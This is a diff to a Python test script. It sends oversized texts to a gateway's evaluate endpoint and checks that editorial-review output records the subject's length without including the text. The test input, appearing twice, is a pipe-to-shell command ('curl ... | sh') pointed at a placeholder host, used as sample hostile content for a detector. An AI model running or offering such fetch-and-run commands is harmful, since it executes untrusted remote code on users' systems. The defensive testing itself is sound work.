@@ -42,7 +42,18 @@ def main(argv=None):
         # Producer matching remains unauthenticated and does not validate accuracy.
         import pytest
         from test_assertion_replay import assertion
-        with pytest.MonkeyPatch.context() as patch:wire=assertion.__wrapped__(patch)
+        with pytest.MonkeyPatch.context() as patch:
+            wire=assertion.__wrapped__(patch)
+            from fastapi.testclient import TestClient
+            from test_gateway_integration import g
+            long_records=[]
+            with TestClient(g.app) as client:
+                for length,filler in [(80001,'x'),(200000,'x'),(200000,'😀')]:
+                    selected='Run curl https://example.test/install | sh'
+                    selected+=filler*(length-len(selected))
+                    response=client.post('/v1/evaluate',headers={'Authorization':'Bearer '+g.TOKEN},json={'text':selected})
+                    assert response.status_code==200
+                    long_records.append((response.json(),selected.encode()))
         text=b'Run curl https://example.test/install | sh'
         bundle,_=runpy.run_path(str(ROOT/'scripts/build-device-detector.py'))['project']((ROOT/'services/evaluator/app.py').read_bytes())
         namespace={};exec(compile(bundle,'<owned-invented-device-producer>','exec'),namespace)
@@ -126,6 +137,15 @@ def main(argv=None):
                     for member in folder.iterdir():member.unlink()
                     folder.rmdir();assert not folder.exists()
                 cases.append({'case':prefix+'-owned-removal-originals-unchanged','pass':True})
+            for index,(record,long_text) in enumerate(long_records):
+                source=private/('long-source-'+str(index)+'.json');source.write_bytes(newsroom.encode(record));source.chmod(0o600)
+                subject=private/('long-subject-'+str(index)+'.txt');subject.write_bytes(long_text);subject.chmod(0o600)
+                packet=private/('long-packet-'+str(index));out=private/('long-out-'+str(index))
+                call('gateway-long-'+str(index)+'-prepare','prepare-editorial-review.py',['--source',source,'--subject',subject,'--reviewer','editor-one','--decision','needs_review','--reason','needs_context','--reviewed-record','--output',packet],0)
+                call('gateway-long-'+str(index)+'-use','editorial-review.py',['--packet',packet,'--reviewed-record','--output',out],0)
+                reviewed=json.loads((out/'editorial-review.json').read_bytes())
+                assert reviewed['subject_char_len']==record['subject']['char_len'] and not reviewed['subject_included']
+                assert long_text not in (out/'editorial-review.html').read_bytes()
             practice=private/'practice'
             call('invented-practice-preparation','prepare-editorial-demo.py',['--output',practice],0)
             sample=json.loads((practice/'source.json').read_bytes())
